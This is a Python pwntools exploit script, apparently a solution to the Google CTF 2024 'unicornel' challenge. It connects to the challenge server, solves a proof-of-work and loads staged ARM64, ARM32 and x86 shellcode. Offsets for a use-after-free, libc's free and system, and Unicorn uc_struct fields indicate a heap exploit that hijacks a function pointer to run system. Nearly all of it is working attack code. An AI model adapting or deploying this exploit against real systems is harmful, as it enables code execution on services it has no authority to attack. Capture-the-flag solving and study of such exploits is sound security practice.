from pwn import *

sys_unicornel_exit = 0
sys_unicornel_write = 1
sys_print_integer = 2
sys_create_shared = 3
sys_map_shared = 4
sys_unmap_shared = 5
sys_bookmark = 6
sys_unicornel_rewind = 7
sys_switch_arch = 8
sys_unicornel_pause = 9
sys_unicornel_resume = 10

# typedef enum uc_arch {
UC_ARCH_ARM = 1  # , // ARM architecture (including Thumb, Thumb-2)
UC_ARCH_ARM64 = 2  # ,   // ARM-64, also called AArch64
# UC_ARCH_MIPS,    // Mips architecture
UC_ARCH_X86 = 4  # ,     // X86 architecture (including x86 & x86-64)
# UC_ARCH_PPC,     // PowerPC architecture
# UC_ARCH_SPARC,   // Sparc architecture
# UC_ARCH_M68K,    // M68K architecture
# UC_ARCH_RISCV,   // RISCV architecture
# UC_ARCH_S390X,   // S390X architecture
# UC_ARCH_TRICORE, // TriCore architecture
# UC_ARCH_MAX,
# } uc_arch;

# // x86 / x64
# UC_MODE_16 = 1 << 1, // 16-bit mode
# UC_MODE_32 = 1 << 2, // 32-bit mode
UC_MODE_64 = 1 << 3  # ,  // 64-bit mode
UC_MODE_ARM = 0  # , // ARM mode


def create_proc(io, sc, arch, mode, mappings: list):
    print('===============================')

    hdr = b''
    hdr += p32(arch)
    hdr += p32(mode)

    hdr += p64(mappings[0][0])  # addr
    hdr += p64(mappings[0][1])  # len
    if len(mappings) > 1:
        hdr += p64(mappings[1][0])  # m1
        hdr += p64(mappings[1][1])
    else:
        hdr += p64(0)
        hdr += p64(0)
    if len(mappings) > 2:
        hdr += p64(mappings[2][0])  # m2
        hdr += p64(mappings[2][1])
    else:
        hdr += p64(0)
        hdr += p64(0)
    if len(mappings) > 3:
        hdr += p64(mappings[3][0])  # m3
        hdr += p64(mappings[3][1])
    else:
        hdr += p64(0)
        hdr += p64(0)
    hdr += p16(len(sc))  # code len
    hdr += p16(len(mappings))  # mappings count
    hdr += p32(0)  # padding

    io.send(hdr)

    io.recvuntil(b'CODE_START')

    io.send(sc)
    io.recvuntil(b'new process created with pid')
    io.recvline()
    print(f'created process {len(sc)} bytes')


va_uaf = 0x5000
shared_size = 0x9000

o_arm_release = 0x701fd0  # hex(0x555555c55fd0-0x555555554000)
o_uc_struct_release = 176
o_uc_struct_read_mem = 168

o_mapped_block = 1864  # offsetof(struct uc_struct, mapped_blocks) 1864

base = 0x555555554000  # TODO

o_free = 0xadd20
o_system = 0x58740

# exe = '/home/korniltsev/CLionProjects/unikernel/cmake-build-debug/unikernel'
exe = '/home/korniltsev/Downloads/d7bd1250bb6d3396bbae23b9f1902a067e8e38b194ae51746a4e7d120628a1b57f808522fb6f301f139de42cca4566a908fd7136cd9e4b492af7571ac950b92d/chal'
gdbscript = '''
# b system
continue
'''


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

scdir = '.'
res = subprocess.check_call(f'{scdir}/build.sh',cwd=scdir)

local = args.LOCAL

host = args.HOST or 'unicornel.2024.ctfcompetition.com'
port = int(args.PORT or 1337)
pow = host == 'unicornel.2024.ctfcompetition.com'

if local:
    print(res)
    io = start()
else:
    io = remote(host, port)
    if pow:
        print("solving pow")
        io.recvuntil(b'solve ')
        io.recvuntil(b'solve ')
        challenge = io.recvline().strip()
        print(challenge)
        solverproc = process(['/home/korniltsev/.pyenv/shims/python', './pow.py', "solve", challenge.strip()])
        solverproc.recvuntil(b'Solution:')
        solution = solverproc.recvline().strip()
        solution = solverproc.recvline().strip()
        print(solution)
        io.sendline(solution)
# solverproc.interactive()
# exit()
print("waiting for prompt")
print(io.recvuntil(b'Welcome to the unicornel!').decode())
print("prompt received")
# io.interactive()


# res = subprocess.check_call(f'{scdir}/build.sh',cwd=scdir)
# print(res)

sc_pid0_stage0 = open(f'{scdir}/unikernel_pid0_stage0.arm64.bin', 'rb').read()
sc_pid0_stage1 = open(f'{scdir}/unikernel_pid0_stage1.arm32.bin', 'rb').read()
sc_pid1 = open(f'{scdir}/unikernel_pid1.x86.bin', 'rb').read()

context.arch = 'amd64'
context.bits = 64
boot_amd64 = asm('''
mov rsp, 0x8000
''')


context.arch = 'arm64'
context.bits = 64
arm64_align = False
if arm64_align:
    # aarch64 compiler assumes it will be loaded at 0x1000 aligned and uses addrp relative addressing
    # so we load our code at 0x1000 and the actual shellcode is at 0x2000
    boot_arm64 = asm('''
        mov SP, 0x8000
        mov x0, 0x2000
        blr x0
    ''').ljust(0x1000)
else:
    # here we do not load at 0x1000 aligned, we rely on compiling shellcode with CFLAGS="-mcmodel=tiny"
    # this forces shellcode to not use addrp isntructions
    boot_arm64 = asm('''
    mov SP, 0x8000
    ''')

pid0code = b''
pid0code += boot_arm64 + sc_pid0_stage0
assert len(pid0code) < 0x400
o_stage1 = 0x400
pid0code = pid0code.ljust(o_stage1, b'\xef')
context.arch = 'arm'
context.bits = 32

pid0code += asm('''
mov SP, 0x8000
    ''')
pid0code += sc_pid0_stage1

create_proc(io, pid0code, UC_ARCH_ARM64, UC_MODE_ARM, mappings=[
    (0x1000, 0x3000),  # code
    (0x7000, 0x1000),  # stack
])

create_proc(io, boot_amd64 + sc_pid1, UC_ARCH_X86, UC_MODE_64, mappings=[
    (0x1000, 0x2000),  # code
    (0x7000, 0x1000),  # stack
])


io.interactive()
